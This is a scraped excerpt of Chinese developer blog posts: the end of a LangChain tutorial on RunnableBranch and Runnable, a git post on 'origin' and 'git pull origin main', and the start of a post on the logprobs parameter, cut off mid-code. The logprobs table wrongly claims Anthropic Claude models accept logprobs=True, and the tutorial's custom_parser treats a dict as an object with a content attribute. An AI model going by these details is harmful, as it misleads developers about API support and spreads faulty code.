    
    <span class="hljs-comment"># 创建分支链</span>
    branch_chain = RunnableBranch(
        (
            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">"翻译"</span> <span class="hljs-keyword">in</span> x.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower(), 
            translation_chain
        ),
        (
            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">"总结"</span> <span class="hljs-keyword">in</span> x.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower(), 
            summarization_chain
        ),
        (
            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">"解释"</span> <span class="hljs-keyword">in</span> x.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower(), 
            explanation_chain
        ),
        translation_chain  <span class="hljs-comment"># 默认链</span>
    )
    
    <span class="hljs-comment"># 测试不同分支</span>
    test_cases = [
        {<span class="hljs-string">"task"</span>: <span class="hljs-string">"翻译"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"LangChain是一个强大的LLM应用开发框架。"</span>},
        {<span class="hljs-string">"task"</span>: <span class="hljs-string">"总结"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"LangChain是一个用于开发LLM应用的开源框架，它提供了丰富的组件和工具，可以帮助开发者快速构建复杂的AI应用。"</span>},
        {<span class="hljs-string">"task"</span>: <span class="hljs-string">"解释"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"大语言模型"</span>}
    ]
    
    results = []
    <span class="hljs-keyword">for</span> i, test_case <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(test_cases, <span class="hljs-number">1</span>):
        result = branch_chain.invoke(test_case)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试 <span class="hljs-subst">{i}</span> (任务: <span class="hljs-subst">{test_case[<span class="hljs-string">'task'</span>]}</span>): <span class="hljs-subst">{result}</span>"</span>)
        results.append(result)
    
    <span class="hljs-keyword">return</span> results

</code></pre>
<h4 data-id="heading-14">Runnable 接口</h4>
<p><code>Runnable</code> 接口是 LangChain 中所有可运行组件的基类，它定义了组件的基本行为，如 <code>invoke</code>、<code>batch</code> 等。通过实现 <code>Runnable</code> 接口，自定义组件可以与 LangChain 的其他组件无缝集成，实现复杂的工作流</p>
<p>简单理解是组合不同的链或者组件功能，实现更复杂的工作流或者功能</p>
<p>重点看下面的例子中最后的返回 <code>return</code> 是返回了一个字典，包含了不同链的处理结果</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">runnable_interface_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 4. Runnable 接口示例 ==="</span>)
    
    <span class="hljs-comment"># 创建基础提示词</span>
    prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个专业的助手。请根据用户的要求处理文本。"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{input}"</span>)
    ])
    
    <span class="hljs-comment"># 1. RunnableLambda：创建自定义处理函数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_text</span>(<span class="hljs-params">text</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"处理后的文本：<span class="hljs-subst">{text.upper()}</span>"</span>
    
    lambda_chain = RunnableLambda(process_text)
    
    <span class="hljs-comment"># 2. RunnableParallel：并行执行多个链</span>
    parallel_chain = RunnableParallel(
        original=prompt | model | output_parser,
        uppercase=prompt | model | output_parser | RunnableLambda(<span class="hljs-keyword">lambda</span> x: x.upper()),
        lowercase=prompt | model | output_parser | RunnableLambda(<span class="hljs-keyword">lambda</span> x: x.lower())
    )
    
    <span class="hljs-comment"># 3. RunnableSequence：顺序执行链（与 | 操作符等价）</span>
    <span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> RunnableSequence
    
    <span class="hljs-comment"># 定义自定义解析器</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_parser</span>(<span class="hljs-params">output</span>):
        <span class="hljs-comment"># 简单示例：只返回包含"框架"的部分</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(output, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">"content"</span> <span class="hljs-keyword">in</span> output:
            <span class="hljs-keyword">return</span> output.content[<span class="hljs-number">0</span>][<span class="hljs-string">'text'</span>] <span class="hljs-keyword">if</span> output.content <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> output
    
    sequence_chain = RunnableSequence(
        first=prompt,
        middle=[model],
        last=RunnableLambda(custom_parser)
    )
    
    <span class="hljs-comment"># 测试Runnable接口</span>
    input_text = <span class="hljs-string">"LangChain是一个强大的LLM应用开发框架。"</span>
    
    <span class="hljs-comment"># 测试RunnableLambda</span>
    lambda_result = lambda_chain.invoke(input_text)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"RunnableLambda结果: <span class="hljs-subst">{lambda_result}</span>"</span>)
    
    <span class="hljs-comment"># 测试RunnableParallel</span>
    parallel_result = parallel_chain.invoke({<span class="hljs-string">"input"</span>: input_text})
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"RunnableParallel结果:"</span>)
    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> parallel_result.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)
    
    <span class="hljs-comment"># 测试RunnableSequence</span>
    sequence_result = sequence_chain.invoke({<span class="hljs-string">"input"</span>: input_text})
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"RunnableSequence结果: <span class="hljs-subst">{sequence_result}</span>"</span>)
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"lambda_result"</span>: lambda_result,
        <span class="hljs-string">"parallel_result"</span>: parallel_result,
        <span class="hljs-string">"sequence_result"</span>: sequence_result
    }

</code></pre>
<h2 data-id="heading-15">小结</h2>
<p>面向AI的学习方式很快，读代码的话需要有一定的基础，比如Python，LLM等，对应的代码自己去运行一下，然后改改参数，看看效果，在实践中去理解组件/函数的功能和作用，下一篇学习LangChain的核心组件 Memory（记忆）和 Document Loaders（文档加载器）</p>
<blockquote>
<p>欢迎留言交流，如果觉得有帮助，可以<code>点个赞</code>支持一下</p>
<p>公众号：草帽lufei</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[git版本控制]git pull origin main]]></title>    <link>https://juejin.cn/post/7595358285721813001</link>    <guid>https://juejin.cn/post/7595358285721813001</guid>    <pubDate>2026-01-15T06:52:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595358285721813001" data-draft-id="7595358285721796617" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[git版本控制]git pull origin main"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-15T06:52:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [git版本控制]git pull origin main
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:52:37.000Z" title="Thu Jan 15 2026 06:52:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Git中，<strong>origin</strong> 和 <strong>git pull</strong> 命令的使用非常常见，下面我会详细解释：</p>
<h2 data-id="heading-0">1. <strong>origin 是什么意思？</strong></h2>
<p><strong>origin</strong> 是Git中<strong>远程仓库的默认别名</strong>：</p>
<ul>
<li>当你克隆（<code>git clone</code>）一个仓库时，Git会自动将源仓库命名为 <code>origin</code></li>
<li>你可以通过 <code>git remote -v</code> 查看所有远程仓库及其URL</li>
<li><code>origin</code> 只是一个别名，你可以重命名它，但约定俗成都用 <code>origin</code></li>
</ul>
<h2 data-id="heading-1">2. <strong>git pull origin main 是什么意思？</strong></h2>
<p>这是一个标准的拉取命令：</p>
<ul>
<li><strong><code>git pull</code></strong> = <code>git fetch</code> + <code>git merge</code></li>
<li><strong><code>origin</code></strong> = 远程仓库的别名</li>
<li><strong><code>main</code></strong> = 远程仓库的分支名</li>
</ul>
<p><strong>完整解释</strong>：
从名为 <code>origin</code> 的远程仓库拉取 <code>main</code> 分支的最新提交，并<strong>合并到当前本地分支</strong></p>
<p><strong>示例场景</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 假设你当前在本地 main 分支</span>
git pull origin main
<span class="hljs-comment"># 等同于：</span>
git fetch origin main    <span class="hljs-comment"># 从远程获取最新数据</span>
git merge origin/main    <span class="hljs-comment"># 将远程分支合并到当前分支</span>
</code></pre>
<h2 data-id="heading-2">3. <strong>git pull origin/main 是什么意思？</strong></h2>
<p><strong>这是个常见错误！</strong> ❌</p>
<ul>
<li><strong><code>origin/main</code></strong> 是一个<strong>远程跟踪分支</strong>（remote-tracking branch）</li>
<li>它表示远程仓库 <code>origin</code> 的 <code>main</code> 分支在<strong>本地的缓存副本</strong></li>
<li><strong>你不能直接对 <code>origin/main</code> 执行 <code>git pull</code></strong></li>
</ul>
<p>正确的理解：</p>
<ul>
<li><code>origin/main</code> 用于查看、比较或合并，但不是拉取的目标</li>
<li>如果你想从远程更新本地的 <code>origin/main</code>，应该使用：
<pre><code class="hljs language-bash" lang="bash">git fetch origin  <span class="hljs-comment"># 这会更新 origin/main</span>
</code></pre>
</li>
</ul>
<h2 data-id="heading-3">4. <strong>重要区别对比</strong></h2>




















<table><thead><tr><th>命令</th><th>正确性</th><th>含义</th></tr></thead><tbody><tr><td><code>git pull origin main</code></td><td>✅ 正确</td><td>从远程仓库origin的main分支拉取并合并</td></tr><tr><td><code>git pull origin/main</code></td><td>❌ 通常错误</td><td>Git会尝试从名为"origin/main"的远程仓库拉取（通常不存在）</td></tr></tbody></table>
<h2 data-id="heading-4">5. <strong>实际使用建议</strong></h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看远程仓库配置</span>
git remote -v

<span class="hljs-comment"># 2. 标准拉取命令（推荐）</span>
git pull origin main

<span class="hljs-comment"># 3. 简写形式（如果当前分支已设置上游跟踪）</span>
git pull
<span class="hljs-comment"># 需要先设置：git branch --set-upstream-to=origin/main</span>

<span class="hljs-comment"># 4. 使用 fetch + merge/rebase（更安全）</span>
git fetch origin          <span class="hljs-comment"># 只获取不合并</span>
git merge origin/main     <span class="hljs-comment"># 手动合并</span>
<span class="hljs-comment"># 或</span>
git rebase origin/main    <span class="hljs-comment"># 变基合并</span>
</code></pre>
<h2 data-id="heading-5">6. <strong>记住这个规则</strong>：</h2>
<ul>
<li><code>origin</code> → 远程仓库的名字</li>
<li><code>main</code> → 分支的名字</li>
<li><code>origin/main</code> → 本地的一个<strong>指针</strong>，指向远程仓库 <code>origin</code> 的 <code>main</code> 分支</li>
</ul>
<p>所以总是使用 <code>git pull &lt;远程仓库名&gt; &lt;分支名&gt;</code> 的格式，而不是 <code>git pull &lt;远程跟踪分支&gt;</code>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Langchain中“logprobs”的作用]]></title>    <link>https://juejin.cn/post/7595351120669098010</link>    <guid>https://juejin.cn/post/7595351120669098010</guid>    <pubDate>2026-01-15T10:27:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595351120669098010" data-draft-id="7595351120669048858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Langchain中“logprobs”的作用"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-15T10:27:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哔哔龙"/> <meta itemprop="url" content="https://juejin.cn/user/4371313960946280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Langchain中“logprobs”的作用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313960946280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哔哔龙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:27:28.000Z" title="Thu Jan 15 2026 10:27:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在大语言模型（LLM）中，<strong><code>logprobs</code> 参数用于控制是否返回每个 token 的对数概率（log probabilities）</strong> 。这个功能在需要 <strong>分析模型置信度、实现自定义采样策略、调试生成过程或构建高级应用（如 Chain-of-Thought 验证、不确定性估计）</strong> 时非常有用。</p>
<hr/>
<h2 data-id="heading-0">✅ 核心作用：返回 token 级别的概率信息</h2>
<p>当你设置 <code>logprobs=True</code>（或指定数量），模型不仅返回生成的文本，还会返回：</p>
<ul>
<li>每个输出 token 的 <strong>对数概率（log probability）</strong></li>
<li>（可选）每个位置的 <strong>Top-K 个候选 token 及其概率</strong></li>
</ul>
<blockquote>
<p>📌 <strong>对数概率（logprob）</strong> 是概率的自然对数（通常以 <code>ln</code> 或 <code>log_e</code> 表示），因为概率值很小（如 0.001），用对数可避免浮点下溢，并便于计算。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">🔍 具体效果（以 OpenAI API 为例）</h2>
<h3 data-id="heading-2">示例请求：</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">response</span> = client.chat.completions.create(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-4o"</span>,
    <span class="hljs-attr">messages</span>=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Hello"</span>}],
    <span class="hljs-attr">logprobs</span>=<span class="hljs-literal">True</span>,      <span class="hljs-comment"># 启用 logprobs</span>
    <span class="hljs-attr">top_logprobs</span>=<span class="hljs-number">2</span>      <span class="hljs-comment"># 返回每个位置概率最高的 2 个 token</span>
)
</code></pre>
<h3 data-id="heading-3">返回结构（简化）：</h3>
<pre><code class="hljs language-css" lang="css">{
  "choices": [{
    "message": {"<span class="hljs-attribute">content</span>": <span class="hljs-string">"Hi there!"</span>},
    "logprobs": {
      "<span class="hljs-attribute">content</span>": [
        {
          "token": <span class="hljs-string">"Hi"</span>,
          <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.15</span>,
          <span class="hljs-string">"top_logprobs"</span>: [
            {"token": <span class="hljs-string">"Hi"</span>, <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.15</span>},
            {"token": <span class="hljs-string">"Hey"</span>, <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.8</span>}
          ]
        },
        {
          "token": <span class="hljs-string">" there"</span>,
          <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.05</span>,
          <span class="hljs-string">"top_logprobs"</span>: [ ... ]
        },
        ...
      ]
    }
  }]
}
</code></pre>
<hr/>
<h2 data-id="heading-4">🎯 主要用途</h2>





























<table><thead><tr><th>应用场景</th><th>说明</th></tr></thead><tbody><tr><td><strong>1. 置信度评估</strong></td><td>如果某个 token 的 <code>logprob</code> 接近 0（如 -0.1），说明模型很确定；如果很负（如 -5.0），说明模型犹豫</td></tr><tr><td><strong>2. 自定义解码策略</strong></td><td>实现 beam search、nucleus sampling 等高级生成算法</td></tr><tr><td><strong>3. 错误检测 / 幻觉识别</strong></td><td>低概率 token 可能是幻觉或错误内容</td></tr><tr><td><strong>4. 强化学习（RLHF）</strong></td><td>计算策略梯度时需要 logprob</td></tr><tr><td><strong>5. 模型对比分析</strong></td><td>比较不同模型对同一输入的 token 级别偏好</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">⚙️ 不同平台的 <code>logprobs</code> 支持情况</h2>



































<table><thead><tr><th>平台 / 模型</th><th>是否支持 <code>logprobs</code></th><th>备注</th></tr></thead><tbody><tr><td><strong>OpenAI (GPT-4o, gpt-3.5)</strong></td><td>✅ 支持</td><td>需显式设置 <code>logprobs=True</code></td></tr><tr><td><strong>Anthropic (Claude 3+)</strong></td><td>✅ 支持</td><td>通过 <code>logprobs=True</code> 和 <code>top_k</code> 控制</td></tr><tr><td><strong>Ollama (Llama 3, Mistral 等)</strong></td><td>⚠️ <strong>部分支持</strong></td><td>需通过底层 API（如 <code>ollama generate</code>）或 LangChain 的 <code>with_logprobs</code></td></tr><tr><td><strong>Hugging Face Transformers</strong></td><td>✅ 支持</td><td>使用 <code>model.generate(..., output_scores=True, return_dict_in_generate=True)</code></td></tr><tr><td><strong>Google Gemini</strong></td><td>❌ 不直接支持</td><td>需用其他方式估算</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">🐍 在 LangChain 中使用 <code>logprobs</code></h2>
<p>LangChain 对部分模型封装了 logprobs 支持：</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_openai import ChatOpenAI

<span class="hljs-attr">llm</span> = ChatOpenAI(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-4o"</span>,
    <span class="hljs-attr">logprobs</span>=<span class="hljs-literal">True</span>,       <span class="hljs-comment"># 启用</span>
    <span class="hljs-attr">top_logprobs</span>=<span class="hljs-number">3</span>       <span class="hljs-comment"># 返回 top-3 候选</span>
)

<span class="hljs-attr">response</span> = llm.invoke(<span class="hljs-string">"What is 2+2?"</span>)
